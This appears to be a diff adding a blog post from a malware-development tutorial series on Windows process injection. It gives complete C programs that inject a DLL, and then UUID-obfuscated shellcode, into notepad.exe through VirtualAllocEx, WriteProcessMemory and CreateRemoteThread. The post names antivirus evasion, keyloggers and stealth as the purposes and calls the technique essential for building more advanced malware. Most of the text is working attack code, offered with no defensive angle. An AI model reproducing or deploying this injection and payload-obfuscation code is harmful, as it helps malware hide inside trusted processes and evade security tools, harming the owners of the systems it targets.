@@ -1,0 +1,260 @@
+> I have started to make hand drawn images to add more value to blog, hope you like it.
+
+# Prerequisites
+As we move further things are getting quite hard, just like my...
+1. Windows API
+2. PE structure
+3. Windows process execution 
+
+# Process Injection ( DLL )
+Its a technique where you **force another process** to load and execute your code. Ya thats legal. So In this case, we are forcing the remote process to load a DLL into its address space. The **DLL contains our malicious code**, which will execute within the target process’s environment.
+
+**Real-world use**: DLL injection isn’t just theory — it’s been used by malware like *Zeus*, *PlugX*, and *TrickBot* to hide inside trusted processes, steal data, and bypass security. Its stealth and flexibility are why it remains a favorite in modern attacks.
+
+why do we need it??
+1. Evading antivirus by hiding code in trusted processes
+2. Keyloggers and spyware loading silently
+3. Stealth
+4. why not
+
+Now lets understand it in simple terms how it works.
+1. We write the *DLL path* in the remote process like (`notepad.exe`)
+2. Load the address of the `LoadLibraryW` in our program
+3. Now `CreateRemoteThread` that will execute `LoadLibraryW` with the path of our DLL
+![your internet sucks image not loaded](/images/Process_Injection-1.png)
+
+Now Now, its not that simple let's go through the code and see if you feel it getting hard...
+1. Getting address of `LoadLibraryW`
+- We are executing `LoadLibraryW` in the remote process so we need the address where it's stored in the remote process. But luckily some dll like `kernel32.dll`, `user32.dll`, `ntdll.dll` are having *same memory address across all the process* so we can directly use the following command and use it.
+```c
+pLoadLibraryW = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
+```
+
+2. Taking a snapshot of the current running process
+- It's like taking a photo and then analyzing it. 
+```c
+allProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+```
+
+3. Traversing through processes
+- Using the following functions to traverse through all the running process
+```c
+Process32First(allProcess, &pe64);
+Process32Next(allProcess, &pe64);
+```
+
+4. Solving the problem of CASE
+- To compare *process name vs required process* we need to compare them after converting the process name to lower case.
+- `WCHAR lower[MAX_PATH * 2]` - it stores the process name in smaller case. `MAX_PATH` is the max length of filename + path for a file(255 char), * 2 coz we are using `wchar` = 2 bytes. We are using it coz windows won't allow filename + path longer than this.
+
+5. Opening the handle to the process
+```c
+DWORD id = pe64.th32ProcessID;
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+```
+
+6. Allocating memory > Writing DLL path > Running thread to load DLL
+```c
+VirtualAllocEx(hProcess, NULL, sizeOfDLL, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, allocAddress, dllName, sizeOfDLL, &lpNumberOfBytesWritten);
+CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, allocAddress, 0, NULL);
+```
+
+```c
+#include <stdio.h>
+#include <windows.h>
+#include <tlhelp32.h>
+#include <wchar.h>
+
+int main(){	
+	
+	HANDLE allProcess;
+	PROCESSENTRY32 pe64;
+	WCHAR processName[] = L"notepad.exe";
+	LPVOID pLoadLibraryW;
+	HANDLE hthread;
+	
+	pLoadLibraryW = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
+	printf("[+] LoadLibraryW @ %p", pLoadLibraryW);
+	getchar();
+	allProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	pe64.dwSize = sizeof( PROCESSENTRY32 );
+	Process32First(allProcess, &pe64);
+	
+	do{
+		WCHAR lower[MAX_PATH * 2];
+		
+		if (pe64.szExeFile){
+			for (int i=0; i < MAX_PATH * 2; i++){
+				lower[i] = tolower(pe64.szExeFile[i]);
+			}
+			if (wcscmp(lower, processName) == 0){			
+				printf("[+] Found the process\n");
+				DWORD id = pe64.th32ProcessID;
+				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+				WCHAR dllName[] = L"C:\\Users\\username\\Desktop\\Malware Dev\\DLL.dll";
+				DWORD sizeOfDLL = lstrlenW(dllName) * sizeof(WCHAR);
+				LPVOID allocAddress;
+				SIZE_T lpNumberOfBytesWritten;
+				
+				allocAddress = VirtualAllocEx(hProcess, NULL, sizeOfDLL, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+				WriteProcessMemory(hProcess, allocAddress, dllName, sizeOfDLL, &lpNumberOfBytesWritten);
+				printf("[+] Running DLL...");
+				hthread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, allocAddress, 0, NULL);
+				if (hthread == NULL){
+					printf("[-] Error %d\n", GetLastError());
+				}
+				getchar();
+				CloseHandle(hthread);				
+				CloseHandle(hProcess);
+			}
+		}
+	}
+	while(Process32Next(allProcess, &pe64));
+	CloseHandle(allProcess);
+	
+	return 0;
+}
+```
+
+**Output**
+- We can see the Address of `LoadLibraryW`. 
+- And we also see in the **Process Hacker's** output the DLL file being loaded
+
+![your internet sucks image not loaded](/images/Process_Injection-2.png)
+
+![your internet sucks image not loaded](/images/Process_Injection-3.png)
+
+# Process Injection ( Shellcode )
+So again the same thing **force another process** to load and execute your code. But in this case we are directly writing our shellcode on to the address space of the remote process
+
+Understanding in easy terms
+1. Allocating memory
+2. Writing shellcode
+3. Changing memory permission
+4. Running shellcode
+
+![your internet sucks image not loaded](/images/Process_Injection-4.png)
+
+1. De obfuscating shellcode
+- I already discussed this in the previous blog [here](https://debug-diary.vercel.app/post/Payload_Obfuscation)
+- But I promise to make a DLL for this coz it's very messy
+
+2. Repeat everything you did above *Snapshot* > *find process* > *get handle*
+
+3. *Allocating memory* > *Writing shellcode* > *Changing memory permission* > *Running shellcode*
+
+```c
+#include <stdio.h>
+#include <windows.h>
+#include <tlhelp32.h>
+#include <wchar.h>
+
+int main(){	
+	
+	HANDLE allProcess;
+	PROCESSENTRY32 pe64;
+	WCHAR processName[] = L"notepad.exe";
+	HANDLE hthread;
+	
+	char UUID[25][37] = {
+        "FC4881E4-F0FF-41d4-a716-FFFFE8CC0000",
+        "00415141-5052-41d4-a716-514831D26548",
+        "8B526056-488B-41d4-a716-5218488B5220",
+        "4D31C948-8B72-41d4-a716-50480FB74A4A",
+        "4831C0AC-3C61-41d4-a716-7C022C2041C1",
+        "C90D4101-C1E2-41d4-a716-ED524151488B",
+        "52208B42-3C48-41d4-a716-01D066817818",
+        "0B020F85-7200-41d4-a716-00008B808800",
+        "00004885-C074-41d4-a716-674801D08B48",
+        "18448B40-2050-41d4-a716-4901D0E35648",
+        "FFC9418B-3488-41d4-a716-4D31C94801D6",
+        "4831C0AC-41C1-41d4-a716-C90D4101C138",
+        "E075F14C-034C-41d4-a716-24084539D175",
+        "D858448B-4024-41d4-a716-4901D066418B",
+        "0C48448B-401C-41d4-a716-4901D0418B04",
+        "88415841-5848-41d4-a716-01D05E595A41",
+        "58415941-5A48-41d4-a716-83EC204152FF",
+        "E0584159-5A48-41d4-a716-8B12E94BFFFF",
+        "FF5DE80B-0000-41d4-a716-007573657233",
+        "322E646C-6C00-41d4-a716-5941BA4C7726",
+        "07FFD549-C7C1-41d4-a716-00000000E805",
+        "00000044-4F4E-41d4-a716-45005AE80900",
+        "00005375-636B-41d4-a716-636573730041",
+        "584831C9-41BA-41d4-a716-45835607FFD5",
+        "4831C941-BAF0-41d4-a716-B5A256FFD590"
+	};
+
+	int rows = sizeof(UUID) / sizeof(UUID[0]);
+	unsigned int size = rows * 12;
+	void *temp = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	
+	printf("[+] Shellcode @ local - 0x%p", temp);
+	getchar();
+	unsigned char* shellcode = (unsigned char*)temp;
+	unsigned char* writer = shellcode;
+	
+	for (int i=0; i < rows; i++){
+		unsigned short segment[12];
+		int result = sscanf(UUID[i], "%02X%02X%02X%02X-%02X%02X-41d4-a716-%02X%02X%02X%02X%02X%02X", &segment[0], &segment[1], &segment[2], &segment[3], &segment[4], &segment[5], &segment[6], &segment[7], &segment[8], &segment[9], &segment[10], &segment[11]);
+				
+        for (int j=0; j < 12; j++){
+            *writer++ = (unsigned char)segment[j];
+        }
+	}
+	
+	allProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	pe64.dwSize = sizeof( PROCESSENTRY32 );
+	Process32First(allProcess, &pe64);
+	
+	do{
+		WCHAR lowName[MAX_PATH * 2];
+		
+		if (pe64.szExeFile){
+			for (int i=0; i < MAX_PATH * 2; i++){
+				lowName[i] = tolower(pe64.szExeFile[i]);
+			}
+			if (wcscmp(lowName, processName) == 0){			
+				DWORD id = pe64.th32ProcessID;
+				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+				LPVOID allocAddress;
+				SIZE_T lpNumberOfBytesWritten;
+				DWORD dwOldProtection;								
+				
+				allocAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+				if (allocAddress == NULL){
+					printf("fails at allocation\n");
+				}
+				if (!WriteProcessMemory(hProcess, allocAddress, shellcode, size, &lpNumberOfBytesWritten)){
+					printf("fails at writing shellcode %d\n", GetLastError());
+				}
+				if (!VirtualProtectEx(hProcess, (LPVOID)allocAddress, size, PAGE_EXECUTE_READWRITE, &dwOldProtection)){
+					printf("fails at chaning permission %d\n", GetLastError());
+				}
+				hthread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocAddress, NULL, 0, NULL);		
+				if (hthread == NULL){
+					printf("[-] Error %d\n", GetLastError());
+				}
+				printf("[+] Shellcode @ remote - 0x%p\n", allocAddress);
+				getchar();
+				CloseHandle(hthread);
+				CloseHandle(hProcess);
+			}
+		}
+	}
+	while(Process32Next(allProcess, &pe64));
+	
+	return 0;
+}
+```
+
+**Output**
+- We can see Both the process `a.exe` and `notepad.exe` had the shellcode and we spawned the *messagebox*
+
+![your internet sucks image not loaded](/images/Process_Injection-5.png)
+
+# Conclusion
+There is no doubt that this is one of the most important technique to master if you want to make more advance malware. 
+
+of course it won't survive against AV's in the current scenario, but that's the topic for another day.
+Thank you for reading.
